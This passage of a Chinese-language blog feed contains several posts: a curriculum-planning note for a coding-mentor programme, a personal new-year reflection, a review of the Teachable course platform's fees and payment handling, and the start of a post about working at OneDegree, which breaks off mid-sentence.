跟 CSS，我想把課綱中前八週的內容變成免費的，任何人都可以隨時來上的課程。</p><p>因此之後要報名程式導師實驗計畫的人，一定都要會這三個東西。評斷標準或許是提供一個整合的作業，要先完成那個作業才能報名。改成這樣有兩個好處：</p><ol><li>為期六個月的程式導師實驗計畫可以教得東西更多，因為有八周空出來了</li><li>可以保證來報名的人都有自學能力（或至少是願意花時間學習的）</li></ol><p>在其他課綱部分，我也有幾個想法但是還沒有決定一定要這樣做，其中一個想法是把原本的一連串的課綱拆成「可以跑兩次的課綱」，例如說 24 周，前兩週 CSS 加強，三四五週 JS 加強，六複習周，七八週 PHP，第九周到第十二週 React。這樣十二週就是一個循環，然後十三週開始就照原本的順序跑，十三十四 CSS 加強，十五六七 JS 加強，十八複習周，十九二十 PHP，21~24 React。</p><p>這樣有什麼好處呢？好處是課綱自帶複習的效果，你不用怕前面那些原生的東西忘記，因為你之後還會再學到一遍。而且這樣可以儘早加快知識的互相融合，你在學 React 意識到不足的 JS 基礎，可以再第二次 JS 循環時學到，那時你就會更知道為什麼要學習這些。</p><p>而且第一遍的循環課程內容可以不用這麼深，把目標放在實作上，讓大家加強實作能力，第二遍的循環才把背後的理論知識補強。</p><p>自己寫一寫覺得看起來滿不錯的，搞不好日後就會這樣來設計課綱。</p><p>其實看第四期的同學回饋的意見，評價普遍是滿正面的，不過從一個課程設計者的角度來看，太多東西可以再加強了，因為這篇是檢討所以都只寫我覺得可以改進的地方，做得好的上次好像已經寫過了。</p><p>一直都有要改的，該如何取捨以及安排順序是值得思考的事。</p><p>話說有關於第五期，如果命運的齒輪沒有出差錯的話，這禮拜會開放報名，到時候會公告於 <a href="https://www.facebook.com/lidemytw">Lidemy</a> 粉專上面，有想要報名的朋友們可以關注一下。</p>]]></content>
      
      
      <categories>
          
          <category> 教學計劃 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教學計劃 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>只是想寫一下</title>
      <link href="/2021/02/13/happy-new-year-moo-e0e0ac5130e2/"/>
      <url>/2021/02/13/happy-new-year-moo-e0e0ac5130e2/</url>
      
        <content type="html"><![CDATA[<p><img src="/img/happy-new-year-moo-e0e0ac5130e2/1__1lFblwAZjaaXDdmhYDdOVw.jpeg"></p><p>持續一陣子了，有一種力不從心，心也不從力的感覺。</p><p>大概就跟之前閉關的時候，到後期決定放棄的感覺差不多，就是其實有很多事情要做，但就是拖延不想做。然後 Medium 這邊也好久沒寫點東西了，不知道為什麼，但總覺得來寫些東西能夠多少改善這個狀況。至少「寫出文章」這一件事情本身，就能夠為自己增加一些產出，無論寫什麼都是。</p><p>而且 Medium 最近的文章好像比較少個人心得了，很久以前的閉關修煉也已經結束一年了，因此就如同標題說的，「只是想寫一下」，想把最近的近況跟一堆心得感想都寫在這邊。</p><p>採用一個很久沒用的文體：條列式。</p><h4 id="其一"><a href="#其一" class="headerlink" title="其一"></a>其一</h4><p>開頭放了名古屋名花之里的照片，因為想出國旅遊了。這是去年二月初的時候拍的，那時候疫情才剛開始，在日本與台灣都還算很早期的時候，從非中國地方入境台灣也不需要隔離。而早在兩三個月前就買好機票的我們，一直猶豫著到底要不要如期出發。</p><p>最後覺得疫情才剛開始風險應該不大，再加上這次不去的話，延期可能要延個半年一年，不知道什麼時候才可以出去，所以就去了。名古屋四天三夜之旅。</p><p>在出國之前我斷斷續續感冒了兩週。但其實看醫生之後說我不是感冒，是扁桃腺炎之類的，每當我覺得好了的時候，再過個兩三天不知道為什麼又開始發燒。但在出國的前幾天，倒是沒什麼感覺。</p><p>可是到了機場的時候，開始覺得喉嚨有點痛痛的，但我也不以為意，想說是不是自己多心了，應該沒什麼問題。當天晚上到了日本，洗澡的時候我就覺得身體怪怪的，怎麼好像有點熱，隔天起床才後知後覺，發現自己發燒了。</p><p>發燒倒是還好，比較麻煩的是喉嚨又開始發炎痛了起來。最痛苦的是吃早餐的時候，飯店的早餐其實很好吃，但每吃一口都是煎熬。痛並快樂著，我想就是這樣吧。</p><p>到了下午就只能躺在床上睡覺，而我女友照顧我到睡著之後，就出去逛了一下順便帶了晚餐回來。對她其實覺得不太好意思，幾乎都沒什麼玩到，就只能一直在名古屋站附近逛，還要分心回來照顧我。</p><p>睡了一覺醒來有覺得好點，我那時想說應該再睡一下就沒事了，畢竟發燒嘛，不是應該很快就好了嗎。</p><p>隔天醒來發現身體還是很不舒服，就查了附近的藥房，去買了成藥。玲瑯滿目的藥不知道該買哪一種，就買了一個治感冒的，一個治喉嚨痛的（再給我一次機會的話，我絕對先買專治退燒的…）。</p><p>回家之後吃了藥睡了覺，醒來覺得好像好了一點。當天晚上本來就排了名花之里的行程，我想說雖然身體還是有點不舒服，但現在不去就沒機會去了，於是那天晚上就跟女友兩個人搭了電車轉公車跑去名花之里了。</p><p>幸好有去，那邊真的很漂亮。不過逛了一兩個小時之後我開始感到有些疲倦，身體又開始變得不太舒服，那時候逛的也差不多了就一樣搭電車回家，大約要差不多四十分鐘左右。</p><p>等到抵達飯店以後，又覺得狀況不太好，趕快洗了個澡就去睡了。半夜睡到一半突然醒來，覺得有點想吐，起身時發覺自己頭越來越暈，連走路都走不好的那種。撐到廁所之後發現自己吐不出來，就再硬撐著回到床上，整個人直接倒下去，想說：「睡一覺醒來再說吧，躺在床上頭就不會暈了」</p><p>隔天早上醒來，狀況還是滿差的。這已經是在名古屋的最後一天了，下午要搭飛機回台灣。早上吃早餐是最痛苦的時候，因為喉嚨痛到靠杯，連吞口水都會很痛的那種。痛到我決定在日本看醫生。問了一下櫃臺附近哪邊可以看醫生，因為路途不遠索性就走了過去。</p><p>走過去之後因為語言不通，英文也不通，就拿出手機靠著 Google 翻譯跟對方溝通，最後先幫我量了體溫。這時我其實覺得自己身體狀況還行，至少可以正常走路，只是喉嚨很痛而已。但體溫出來之後我嚇了一跳，40 度。靠杯，原來我發燒嗎。</p><p>那邊的護士也嚇了一跳，我也嚇了一跳，原來這麼高嗎。接著一陣雞同鴨講之後，雖然說那時候疫情才剛開始，但大家都有警覺心了，而且儘管我說沒有去過中國，我是台灣人，但對方還是說他們不收，要把我轉去更大的醫院。</p><p>於是後來就搭了計程車，去了另外一間更大的醫院。在那邊先填了一些基本資料，對方一直以為我是從中國來的，好一陣子之後才講清楚我從台灣直接過來的，沒有去過中國。</p><p>等了大概一個小時終於看到醫生，這時候可以用英文溝通了，醫生好像懷疑我是什麼 A 型流感還是 B 型流感，於是幫我做了快篩，就一樣是要從鼻子督進去的那種，流了不少眼淚。</p><p>再等了一陣子之後，醫生跟我說不用擔心，就是流感而已，吃個藥應該就會好了。最後拿了藥，搭了計程車回到飯店。把藥吃了稍微再休息一下，就差不多要去機場了。</p><p>因為有吃藥的關係，身體狀況好了很多，只是喉嚨還在痛而已，沒那麼快好。到台灣入境時也有誠實填寫防疫的那個表單，說明了狀況，對方看我沒有中國旅遊史也沒有接觸史，就跟我說好好休息而已。</p><p>回到台灣過幾天之後再跑去看醫生，拿了藥，吃了藥，覺得身體好轉，藥吃完過三四天，喉嚨又開始痛。這個輪迴持續了大概三次，最後身體才終於完全康復。醫生說有可能是壓力的關係，只要壓力一來可能身體狀況就會變差，那些潛藏的病毒又會再次出現。</p><p>感謝日本的醫生，感謝台灣的醫生，感謝女友。那次旅遊其實幾乎沒玩到什麼，說實話有一點可惜，希望疫情能早日過去，讓世界恢復正常運轉。</p><p>話說我女友全程身體健康，回台灣之後也沒有任何不適症狀，沒有任何一隻女友受到傷害。真是有夠厲害。</p><h4 id="其二"><a href="#其二" class="headerlink" title="其二"></a>其二</h4><p>大概是從工作之後開始，體重就變成了一種回不去的東西，只會上升，不會下降。最近更是來到人生中的體重高峰，至於是多少，我不敢量，所以我也不知道。</p><p>之前看到了這一篇：<a href="https://medium.com/daydreamengineer-%E7%99%BD%E6%97%A5%E5%A4%A2%E5%B7%A5%E7%A8%8B%E5%B8%AB/%E9%AB%94%E6%85%8B%E6%89%93%E9%80%A0-3%E5%80%8B%E6%9C%88%E6%B8%9B%E8%84%82-10-%E7%94%B1%E8%82%A5%E5%AE%85%E5%B7%A5%E7%A8%8B%E5%B8%AB%E8%BD%89%E8%AE%8A%E6%88%90%E7%B2%BE%E5%A3%AF%E7%94%B7%E7%9A%84%E6%8C%91%E6%88%B0%E6%97%85%E7%A8%8B-28e11f5f82c">【體態打造】3個月減脂 10%，由肥宅工程師轉變成精壯男的挑戰旅程</a>，本來想說可以參考一下，直到我看到了這一段：</p><blockquote><p><em>所以我認為最重要的是</em><strong><em>你認為你自己是個怎麼樣的人</em></strong><em>，也就是所謂的</em><strong><em>自我認知</em></strong><em>。以我自己為例，我就把自己設定成「</em><strong><em>有紀律</em></strong><em>」、「</em><strong><em>注重生活規律</em></strong><em>」及「</em><strong><em>有自己原則</em></strong><em>」的人</em></p></blockquote><blockquote><p><strong><em>當你的自我認知跟你的行為有一致性，你就不會單純的被一時的熱情或衝動驅動而做出當下的行為，而是把這件事當作理所當然。</em></strong></p></blockquote><p>看完之後我就覺得我完蛋了，如果要談自我認知的話，我對自己的認知大概是：<strong>其實不是很在乎自己會變得怎麼樣，懶惰，拖延症，沒有原則的人。</strong></p><p>如果自我認知就是這樣的話，看來就是個打從心底會失敗的狀況。</p><p>就像我以前寫過的，我覺得我的動力必須來自於他人，這是我目前找到的生存之道，所以真的想瘦身的話我有想過乾脆一個月花個兩三萬來找一對一的健身教練好了。靠著花錢來瘦身，是我目前覺得有可能對我最有效的方式，因為其他方式都行不通。</p><p>我一方面覺得保持運動習慣是很不錯的，畢竟這樣才會身體健康嘛，但另一方面覺得不運動也不會怎麼樣，就是體重越來越重，身體變差，最慘大概就是得了什麼病然後離開人世。對我來說這也不是什麼好懼怕的事情。</p><p>不過保持運動習慣這是一件我試了四五次但是都沒有成功的事情，是確實滿想成功一次看看的。大家有推薦什麼在台北的健身私人教練的話可以留言或是私訊給我，我會參考看看。</p><h4 id="其三"><a href="#其三" class="headerlink" title="其三"></a>其三</h4><p>程式導師實驗計畫第四期結束了，之後要找時間來寫個心得。但其實老實說，這一期的心得會比之前都難想。</p><p>我覺得原因是，這一期有了助教之後，我有種退居第二線的感覺。助教在第一線，我在第二線，有點像是本來每一堂課都親自去上的補習班老師，開始變成了補習班招牌上的名稱，上課的是一些新面孔，自己只有偶爾才會跳下去上課。</p><p>但我是不喜歡這種感覺的，我想站在第一線。沒有站在第一線的話，好像會少了滿多東西跟滿多寶貴的機會。</p><p>最近也要來籌畫第五期了，這就是我開頭所說的，也在煩惱的事情之一。明明很多事情要做但都還沒開始。其實有幾次也想過說要放棄，乾脆不要做了，就可以整天耍廢了。</p><p>但是之前自己說一定會開下一期，而且也確實有人在期待著，所以放棄是不行的。這也呼應到了我前面所說的，我的動力是來自於他人而不是自己，我自己的話應該很快就放棄了。</p><p>最近我總是想著，會不會就是因為自己每天都想說「今天一定要做什麼」，但最後沒有做到，在這樣的迴圈下狀況越來越差。但儘管我會這樣反思，卻好像對實際狀況沒有什麼好轉，還是一樣不會開始做事。</p><p>我在想到底有什麼方法可以讓動起來，前陣子在玩的 CTF 是一個可以參考的指標，那東西可以讓我假日兩天沈迷其中，幾乎不太管其他事情。如果能把這種動力運用在其他地方就好了，但好像不太行。</p><h4 id="其四"><a href="#其四" class="headerlink" title="其四"></a>其四</h4><p>這其實有點矛盾，還是說大家也都這麼矛盾。想看到，卻又不想被看到。或如果比較精確地講，應該是想看到，可是不想知道被看到。</p><p>之前還在新加坡的時候，在寫東西這件事情上其實是比較輕鬆的，就是寫完之後放著或是分享到臉書，實際生活中碰到的人，大概也只有我的兩位室友有可能跟我談論我寫了什麼，否則的話在日常生活中，就彷彿我寫的文章從來不存在一樣。</p><p>但現在不一樣了。日常生活中，同事會看我的文章，甚至來面試的也會說我有看你寫的東西（但應該是技術文章啦），之前跟大學同學吃飯，對方說她碰過幾個人跟她說：「欸欸你認識 Huli 喔」。</p><p>當聽到這些的時候，或是當聽到有人親口跟我說：「我有在看你的部落格」的時候，那個心情是矛盾的。一方面會覺得：感謝感謝，感謝你有在看，另一方面卻又會覺得有點小尷尬，就好像是「雖然感謝你的收看，但我沒有很想在現實生活中被認出來，我沒有很想當面聊我寫的東西」。</p><p>但這本來就不是我可以選擇的事情。當我決定用真實身份而不是匿名帳號在網路上闖蕩的時候，就應該預料到會有這種結果了。名氣這種事情，是有好處的，例如說可以接到業配，然後可以收到一些陌生網友寄來的訊息或是信件，這些都挺有趣的。</p><p>但相對應的壞處就是會在現實生活中被認出來，總之不知道為什麼，就是覺得有點不自在。可能我更希望的是，網路上是一個身份，現實生活中又是另外一個，而這兩個在我想關聯的時候是關聯的，不想關聯的時候是切開的。這樣好像太過任性了，又要馬兒跑又要馬兒不吃草，沒那麼好的事情。</p><p>或許久了之後，可能會漸漸習慣吧。</p><p>不過老實說，這確實會影響到寫東西的意願。當沒有在看你寫的東西的時候，你可以想寫什麼就寫什麼，可是一旦有人看了，就會開始有一些顧慮。倒也不是說「寫這個讀者會喜歡嗎」的這種顧慮，而是「我真的要把這些事情暴露出來嗎」的顧慮，自我揭露程度的多寡會受到影響。</p><p>儘管我覺得自己已經算相對上沒那麼在意他人的眼光，但依然無法做到百分之百，確實是太難了。從這點來看，還是匿名帳號來得好，匿名的確可以增加文章的真實程度，願意讓人暴露出更多的自我以及真實的感想。</p><h4 id="其五"><a href="#其五" class="headerlink" title="其五"></a>其五</h4><p>最近有一種，什麼事情都很穩定的感覺。工作穩定，生活穩定，感情穩定，真的什麼都滿穩的。在這種狀態下，日子是會快速流逝的。</p><p>可是在這種狀況下，反而才會有點擔心吧，擔心這樣子的穩定平衡被破壞。</p><p>雖然說我自己定義自己是一個懶惰的人，但其實某一方面也閒不下來，我有想做的事情，我沒辦法停下來。我沒辦法就是，什麼都不做，然後每一天都看動畫看漫畫看影集看 YouTube 看各種東西。我會覺得那樣的生活，沒有在進步。</p><p>我沒有覺得大家都一定要繼續前進，停在原地也是自己的選擇，而這選擇沒有對錯。但對我自己來說，我就是沒辦法接受自己原地踏步。所以如同開頭所說的，在這種心不足力也不足的狀態之下，才會感受到不安與愧疚吧，覺得自己應該做點事，可是卻又提不起勁來。</p><p>不過幸好我有寫了這一篇，覺得好像有了一點動力。持續性的無產出真的會讓人心累，有產出的話至少知道自己是在前進的。</p><h4 id="其六"><a href="#其六" class="headerlink" title="其六"></a>其六</h4><p>以往這些東西應該是寫在臉書的，但我已經很久沒有用臉書了。埃居的話也早就刪掉了。刪掉的理由很簡單，因為用哀居不會使我變得更開心，而且我其實，也沒有那麼想知道朋友的近況。臉書也是類似的理由，app 早就刪掉了，手機都用網頁版來看，還留著臉書是因為可以看到技術文章跟技術社團的發文，沒有這些的話我應該也會放著不動。</p><p>然後這篇太長，所以也沒辦法寫在推特，想來想去還是寫在這邊最適合。寫在這邊，然後臉書不要發文，就只有真正有在追蹤 Medium 的讀者才看得到，而不是所有的臉書好友都看得到。</p><h4 id="其七"><a href="#其七" class="headerlink" title="其七"></a>其七</h4><p>最近有件事情有點困擾卻又沒那麼困擾。</p><p>之前買了新的桌子跟椅子，怎麼擺都覺得姿勢不太對，怎麼調都不好，可是又懶得再買新的椅子或是桌子。像辦公室的我就覺得很不錯，但是家裡的就覺得好像怪怪的。不過在寫這篇文章的時候卻又覺得還好，因為我一樣是順利的寫完了。</p><p>或許當時花多點錢買升降桌跟更厲害的椅子會比較好吧，不過還是狠不下心就是了。</p><h4 id="其八"><a href="#其八" class="headerlink" title="其八"></a>其八</h4><p>哞哞哞，祝大家新年快樂</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>線上課程平台 Teachable 介紹與使用心得</title>
      <link href="/2021/01/03/teachable-introduction-and-review-ca3946e9a1e1/"/>
      <url>/2021/01/03/teachable-introduction-and-review-ca3946e9a1e1/</url>
      
        <content type="html"><![CDATA[<p>最近幾年線上課程滿夯的，除了那些主流的課程平台之外，也有些人會想選擇自己弄一個自己的平台，少了一些限制，也能夠免除掉跟平台的分成，一些優缺點我在<a href="/2018/09/18/hahow-and-lidemy-2dab35919bb8/">《把 Hahow 的課程下架之後，我的下一步是什麼？》</a>都有提過了。</p><p>而如果想要自己弄一個平台的話，最多人選的大概就是 <a href="https://www.thinkific.com/">Thinkific</a> 跟 <a href="https://teachable.sjv.io/AoyVr1">Teachable</a> 了。因為我自己的整個平台 <a href="http://lidemy.com/">Lidemy 鋰學院</a>都是用 Teachable 建的，所以偶爾會收到一些信件來問我使用狀況跟心得，想說每次都個別回答的話有點沒效率，索性就寫了這篇。</p><p>底下就來談談各個 Teachable 的功能以及我個人的使用心得。</p><h3 id="費用"><a href="#費用" class="headerlink" title="費用"></a>費用</h3><p>我剛使用 Teachable 的時候它其實有四個方案，Free、Basic、Pro、Business，現在只剩下後三個。</p><p>原本的免費方案我記得沒什麼限制，就功能比較少（但很夠用），然後抽成手續費比較高，但後來這方案沒了，改成 14 天的 Pro 試用。</p><p>總之呢，我免費方案試用一段期間之後，就改成了 Basic 方案，年繳的話一個月是 29 元美金，整年下來 348 USD 將近 10000 塊台幣。</p><p>前陣子則是因為黑色星期五的特價買了將近半價的 Pro 方案，改了之後其實沒有太大的區別。除了金流的手續費少了 5% 以外，多的功能就是：</p><ol><li>可以看到每一個學生跟每一堂課的進度，例如說每個單元完成率有多少</li><li>課程中可以出題目</li><li>可以去除 Teachable 的 brand</li></ol><p>但上面這些功能我本來就用不到，所以真的是沒什麼差。</p><p>金流的部份我們待會再談，先幫費用這邊做個總結。</p><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1____kHLgKPLPQoxDozXvdHQBQ.png"></p><p>我覺得其實 Basic 就很夠用了，除非你用一段時間真的覺得你想要的功能只有 Pro 有，那再換 Pro 就好。或者是你精算過課程的收入，比如說 Pro 比 Basic 一個月多了 70 塊美金，然後升級的話每一筆交易可以少 5% 手續費，所以 70 * (100&#x2F;5) &#x3D; 1400 美金，一個月的課程收入如果有超過 1400 美金，那轉成 Pro 方案就會是比較划算的。</p><h3 id="金流"><a href="#金流" class="headerlink" title="金流"></a>金流</h3><p>再來談談大家最關心的問題，金流。</p><p>Teachable 處理金流的方式其實分三種：</p><ol><li>Teachable Payments</li><li>Monthly Payment Gateway</li><li>Custom Payment Gateways</li></ol><p>第一種限制只有居住在美國、加拿大、英國跟德國的使用者可以用，所以你跟我一樣在台灣的話只有後兩者可以選擇。</p><p>再來我們先講第三種，這最簡單，你必須先準備一個 Stripe 帳號，然後你網站上的付款都會直接進去這個 Stripe 帳號，中間不會過 Teachable，所以手續費是 0 元。</p><p>但別忘記這是「Teachable 不收手續費」，但任何的金流處理一定都需要費用，所以 Stripe 本身也會收手續費，費用應該是每筆 2.9% + 0.3 USD。所以總共的金流成本就是這樣。</p><p>不過有一些缺點，那就是退款的話沒辦法在 Teachable 後台處理，你要自己去 Stripe 上面處理退款。然後還有一個更大的問題，那就是你必須要有 Stripe 帳號。Stripe 目前不開放台灣申請，所以你必須找其他方法去辦到一個帳號。</p><p>所以綜合以上，我也不推薦使用第三種。</p><p>我自己跟我推薦使用的都是第二種：Monthly Payment Gateway（簡稱 MPG）。</p><p>MPG 的概念很簡單，就是金流會先過 Teachable 那邊，然後以月結的形式再轉到你的 PayPal 帳戶。因為金流有過那邊所以需要處理的費用，這就是我上面講的，Basic 是 5%，Pro 是 0%。</p><p>不過再次強調，這是「Teachble 幫你處理金流的手續費」，還要再加上金流本身的處理費用，基本上就是 2.9% + 0.3 USD（請見下圖），這是無論用哪個金流都一定會需要的錢。</p><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1__66Q9GNp8dkDT7WuGHSBkzA.png"></p><p>所以如果你選擇 MPG 外加 Pro 方案，一筆交易的總成本就是 2.9% + 0.3 USD，跟選擇 custom payment gateway 是一樣的。</p><p>但 MPG 因為金流有過 Teachable，所以有一些好處，例如說退款可以直接在平台上進行處理，滿方便的。但如果你不想等一個月的話，就只能用 custom payment gateway 了。</p><p>另外還有一點要注意，如果你的課程價格是台幣，在交易時都會先轉成美金再來做計算，最後匯到你 PayPal 帳戶時也會用美金，如下圖所示：</p><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1__unOwgCVkedDtVSVL__8EENQ.png"></p><p>再來，有些人可能有聽過，台灣的 PayPal 帳號不能收同樣來自台灣的款項，而 Teachable 預設就正好是用 PayPal，所以擔心是不是沒辦法收錢。</p><p>還記得我上面所說的嗎？MPG 金流會先過 Teachable 那邊，所以其實是：</p><ol><li>消費者在網站上透過信用卡付錢</li><li>錢先進到 Teachable 那裡（進到他們的 Stripe 或是 PayPal）</li><li>Teachable 再把錢轉到你的 PayPal</li></ol><p>所以我們並不會直接跟消費者收款，因此不會有「收台灣的款項」這件事，也就不會有上面的限制。</p><p>總而言之呢，無論你用的是哪一個，收台灣的信用卡都是完全 ok 的，不需要擔心這個問題。但如果考量到成本跟費用的話，除了每筆交易一定都有的一個 2.9% + 0.3 USD 以外，還需要考量到「從 PayPal 轉到台灣銀行帳戶」這件事。</p><p>畢竟上面所說的，錢都是以美金進到你的 PayPal 帳戶，如果你沒有要直接從那邊花掉，那想必是要再轉進台灣的戶頭。這邊會需要透過<a href="https://www.paypal.com/tw/webapps/mpp/withdrawal-process">玉山全球通</a>把款項轉進來，然後會再收一筆 2.5% 的手續費。</p><p>而且如果你是想收到台幣而不是美金，那從買課一直到拿錢，中間就會經過兩次的匯差：</p><ol><li>使用者購買台幣 100 塊的課程</li><li>Teachable 把它轉為美金（請見上面交易明細）</li><li>扣除金流處理費 2.9% + 0.3 USD</li><li>扣除服務費（Basic 5%，Pro 以上 0%）</li><li>存入你的 PayPal</li><li>從 PayPal 提領（美金）</li><li>扣除 2.5% 手續費</li><li>轉回台幣</li></ol><p>這些金流成本是在計算成本時也需要一併考慮的部分。</p><p>但總之呢，如果規模小的話應該差不了多少，要接收台灣使用者的付款是絕對沒問題的。</p><h3 id="平台核心功能"><a href="#平台核心功能" class="headerlink" title="平台核心功能"></a>平台核心功能</h3><p>前面金流的部分講了滿多的，再來我們來講一下平台的各個功能，首先先來講課程的部分。</p><p>在課程上我覺得基本功能都有了，像是：</p><ol><li>課程除了影片還可以有其他檔案或是有格式的文字</li><li>可以開放試看、開放下載</li><li>課程底下可以開放留言</li></ol><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1__pxqCC__yDgkwNYnbtJFpg8g.png"></p><p>然後還有個功能我超喜歡，那就是右上角的那個 Bulk Upload。上傳課程是一件很煩的事，尤其是你一次要上傳十幾支或更多影片的時候。Teachable 在上傳影片時有支援 Google Drive 或是 Dropbox 的同步，根據我自己使用過的經驗，你先把影片上傳到 Google Drive，再從 Google Drive 同步過去，會比自己電腦直接上傳到 Teachable 還要快。</p><p>而且 Bulk Upload 這功能很方便，你可以一次選很多支 Google Drive 的影片，然後它會一起全部同步過來，每一個影片會開一個新的 lecture，接下來就只要編輯 lecture 就好。</p><p>在上傳課程這方面我覺得 Teachable 做得真的滿不錯的，至少速度很 ok。</p><p>然後定價方案也很彈性，可以設定成一次性的付費或是訂閱制都行，要把多個課程打包一起賣也可以，coupon 的使用也可以設定成是要固定折價還是比例折扣，然後有哪些課程適用。</p><p>總而言之呢，我覺得課程的模組做的滿 ok 的，基本功能都有。</p><h4 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h4><p>在首頁會有一些圖表讓你看：</p><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1__3qOx6QRhRcnQyo____y0O1nw.png"></p><p>例如說最近的收益啦，新註冊的人數啦等等，右側還會有一欄是最近的活動，但礙於個資問題就不截圖給大家看了，內容大概就是誰誰誰剛剛買了什麼課之類的。</p><h4 id="全站設定"><a href="#全站設定" class="headerlink" title="全站設定"></a>全站設定</h4><p>平台在設定部分也提供不少選項，你要改名稱一定是可以的，要設定 Facebook pixel 或是 GA 也沒問題，再來大家會關心的中文化也沒問題，但這邊 Teachable 的手段比較特別一點。</p><p>Teachable 本身應該是完全不做多國語系，而是把這個彈性交給管理員自己，所以提供這樣的一個介面：</p><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1____FrOQSz6ruhGOFwhEulAXQ.png"></p><p>可以讓你去設定網站上出現的各個文字要顯示成什麼。所以就要在這邊自己中文化。</p><p>而且這種做法其實就斬斷了 i18n 的彈性，例如說網站如果同時要給英文使用者跟中文使用者，就沒辦法針對前者顯示英文，後者顯示中文，好像一定只能統一一個。</p><p>不過如果像我一樣只服務中文使用者的話，這功能其實就滿實用的，可以自己決定顯示的文字長什麼樣子。</p><p>其他自訂設定像是導覽列、custom domain 之類的我就不提了。</p><p>Teachable 的功能其實不少，但老實說有很大一部分我平常可能都不會使用到。例如說它的強項之一其實是銷售方面的，所以提供了很多跟 affiliates 相關的功能，例如說透過某個 affiliates 賣的課程要分給他多少，也會透過 MPG 自動把錢幫你算好然後轉進去。</p><p>但這部分的功能我完全用不到，所以也沒什麼可以分享的。</p><p>總之我覺得以一個線上課程網站來說，功能算是很夠用的了。</p><h3 id="其他附加功能"><a href="#其他附加功能" class="headerlink" title="其他附加功能"></a>其他附加功能</h3><p>有兩個附加功能我覺得值得一提，第一個是 Email，可以在後台寄 Email 給使用者，還會統計開信率之類的：</p><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1__y4Vfc67y5j5h8zAZaCXKiA.png"></p><p>不過根據我之前使用過的經驗，不知道為什麼有時候信發不出去，所以如果需要比較嚴謹的功能，還是串接 mailchimp 然後自己做可能會比較好。</p><p>另一個值得提的功能是部落格，一個很陽春的部落格，只有提供發表文章的功能而已，甚至連分類都沒有：</p><p><img src="/img/teachable-introduction-and-review-ca3946e9a1e1/1__O5ti6EM6sdswIt__EpIa3pw.png"></p><p>因為功能實在太陽春了，原本想把它當放學生心得的地方，後來想想還是算了。所以這功能我後來也沒在用。</p><h3 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h3><p>差不多該做個總結了。</p><p>在方案選擇部分，建議大家先使用 Basic，因為升級到 Pro 之後也沒多太多功能，我自己覺得 Basic 就很夠用了。</p><p>在金流方面，收取台灣使用者的信用卡是絕對沒問題的，所以在台灣賣課程是 ok 的，但每一筆會收金流手續費 2.9% + 0.3 USD（金流提供商 Stripe 或是 PayPal 收的），外加 Basic 方案的 5% 手續費（Teachable 收的），把錢轉回來帳戶時也會再收一筆 2.5% 的手續費（PayPal 收的）。</p><p>許多人擔心的「台灣 PayPal 不能收台灣的款項」也不會發生，因為付的款項不會直接到你帳戶，而是會透過 Teachable 轉一手，因此不會有這問題。</p><p>在功能方面，有關於課程的基本功能我覺得都有了，雖然私心想要再加兩個功能就是了：</p><ol><li>課程評價功能，這個目前完全沒有，學生無法在購買課程後留下評價</li><li>討論區功能，希望每個課程或是整個 school 有一個共同的討論區，但目前也沒有</li></ol><p>在賣課的部分也提供了彈性的 coupon 跟定價方案，銷售的頁面也可以自訂，想要找其他人幫你賣課分成也沒有問題。</p><p>其他全站設定的部分，中文化 ok，自訂網址或是串 GA 也完全沒有問題。</p><p>如果你想要有一個自己的課程平台，以我個人的使用經驗而已，我覺得 Teachable 是一個不錯的入門選擇。</p><p>以上就是針對 <a href="https://teachable.sjv.io/AoyVr1">Teachable</a> 的使用心得，希望能幫助到大家。</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Others </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>金融保險科技公司 OneDegree 工作半年心得</title>
      <link href="/2020/12/08/working-at-onedegree-378a0401130e/"/>
      <url>/2020/12/08/working-at-onedegree-378a0401130e/</url>
      
        <content type="html"><![CDATA[<p>如果有看過我之前寫的《<a href="/2020/04/28/2020-senior-front-end-engineer-interview-249c719c1a97/">2020 資深前端工程師面試心得（4y, 100k+）</a>》，應該會知道我後來去了一間叫做 OneDegree 的公司，我是 5 月11 號進去的，到現在大概半年多了，是個很適合寫心得的時間點。</p><p>（2023&#x2F;05&#x2F;07 加註：我已於 2023&#x2F;05&#x2F;05 因為個人因素離職，結束了在 OneDegree 將近三年的旅程。這篇心得文章裡面寫的內容是發文的時間點，其實距離現在也滿久了，有些資訊已經過舊，建議讀者們參考網路上其他時間點更近的心得，會比較貼近目前的狀況）</p><p>不過這篇心得不是普通的心得，因為除了個人心得之外還會有一些公司介紹的部分，所以嚴格來說就是半公司介紹半工作心得，一來想說這樣可以讓大家閱讀文章時更融入（？），二來也是我會在文章尾巴順便幫公司工商一下，如果看完公司介紹跟這篇心得之後對 OneDegree 有興趣然後剛好有適合的職缺，歡迎來投履歷，希望未來有機會能當同事。</p><p>就讓我先來介紹一下我們公司到底在做什麼好了。</p><h3 id="OneDegree-在幹嘛？"><a href="#OneDegree-在幹嘛？" class="headerlink" title="OneDegree 在幹嘛？"></a>OneDegree 在幹嘛？</h3><p>先用簡單一句話來講，可以把我們公司想成：</p><blockquote><p>拿到了香港純網路保險執照的科技公司</p></blockquote><p>上面這一句就兩個重點，一是保險，二是科技公司。</p><p>在產品面上公司在做的事情有三塊，分別是：</p><ol><li>開發保險科技平台（B2B，可以跟其他保險業者合作）</li><li>公司自己賣的保險產品（B2C，目前以寵物險為主）</li><li>資安檢測 SaaS 平台（還沒正式上線）</li></ol><p>先來講第一塊好了，總而言之就是一個保險系統，有後台前台也有 API 可以自行串接，假設今天有保險公司找我們合作，我們就可以利用這個系統幫他快速建立出一個新的保險產品，然後提供給他們一個後台可以看到各個保單的狀況，也有一個前台可以讓使用者購買保險，也可以透過 API 跟保險公司內部的系統做整合。</p><p>這個平台叫作 IXT 